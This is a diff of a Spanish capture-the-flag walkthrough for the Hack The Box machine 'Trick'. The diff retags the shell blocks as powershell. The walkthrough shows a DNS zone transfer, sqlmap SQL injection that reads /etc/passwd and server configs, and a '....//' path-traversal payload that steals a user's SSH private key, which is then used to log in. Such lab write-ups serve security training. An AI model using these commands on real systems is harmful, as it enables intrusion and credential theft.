@@ -9,7 +9,7 @@ slug: 'box/trick'
 Empezamos con un <i>whatweb</i> y nuestro escaneo habitual, usaremos
 <a src="https://github.com/RustScan/RustScan" target='_blank'> RustScan.</a>
 
-```bash
+```powershell
 root@loe# whatweb 10.10.11.166
 http://10.10.11.166 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.14.2], IP[10.10.11.166], Script, Title[Coming Soon - Start Bootstrap Theme], nginx[1.14.2]
 root@loe# rustscan -a 10.10.11.166 -- -sS -n -Pn
@@ -52,7 +52,7 @@ Raw packets sent: 4 (176B) | Rcvd: 4 (176B)
 
 Tenemos cuatro puertos abiertos, y esta montado con <a src='https://www.plesk.com/blog/various/nginx-configuration-guide/'>NGINX</a> veremos que servicios corren...
 
-```bash
+```powershell
 root@loe# rustscan -a 10.10.11.166 -p 22,25,53,80 -- -sCV
 The Modern Day Port Scanner.
 ________________________________________
@@ -112,7 +112,7 @@ width={600}
 height={378}
 />
 
-```bash
+```powershell
 root@loe# dig axfr trick.htb @10.10.11.166
 ; <<>> DiG 9.16.27-Debian <<>> axfr trick.htb @10.10.11.166
 ;; global options: +cmd
@@ -185,7 +185,7 @@ width={812}
 height={321}
 />
 
-```bash
+```powershell
 root@loe# sqlmap --url "http://preprod-payroll.trick.htb/ajax.php?action=save_employee" --data "id=&firstname=loefirst&middlename=&lastname=loelast&department_id=1&position_id=1&salary=2000" --file-read "/etc/passwd" --batch --dbs --threads 10 --current-user --current-db
 ...
 
@@ -240,7 +240,7 @@ width={812}
 height={321}
 />
 
-```bash
+```powershell
 root@loe# sqlmap -r trick_burp_nginx_FILE.req --batch --dbms mysql --threads 10 --file-read=/etc/nginx/nginx.conf
 
 [00:08:56] [INFO] parsing HTTP request from 'trick_burp_nginx_FILE.req'
@@ -340,7 +340,7 @@ include /etc/nginx/sites-enabled/*;
 
 escaneamos este archivo <i>include /etc/nginx/sites-enabled/default;</i> que es el enlace simbólico predeterminado del host en el servidor Web
 
-```bash
+```powershell
 root@loe# sqlmap -r trick_burp_nginx_FILE.req --batch --dbms mysql --threads 10 --file-read=/etc/nginx/sites-enabled/default
 ...
 root@loe# cat /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default
@@ -406,7 +406,7 @@ fastcgi_pass unix:/run/php/php7.3-fpm.sock;
 
 vemos que el servidor de <i>preprod-marketing.trick.htb</i> esta bajo el directorio <i>/var/www/market/index.php</i>, hacemos el ultimo escan.
 
-```bash
+```powershell
 root@loe# sqlmap -r trick_burp_nginx_FILE.req --batch --dbms mysql --threads 10 --file-read=/var/www/market/index.php
 ...
 root@loe# cat /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_var_www_market_index.php
@@ -425,7 +425,7 @@ este script es el que buscabamos la variable <i>page</i> que es sensible a <i>Pa
 reemplaza '../' con espacio vacio asi que simplemente pondremos <i>http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//home/michael/.ssh/id_rsa</i>,
 lo descargamos e ingresamos por ssh.
 
-```bash
+```powershell
 ssh -i id_rsa michael@10.10.11.166
 Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64
 
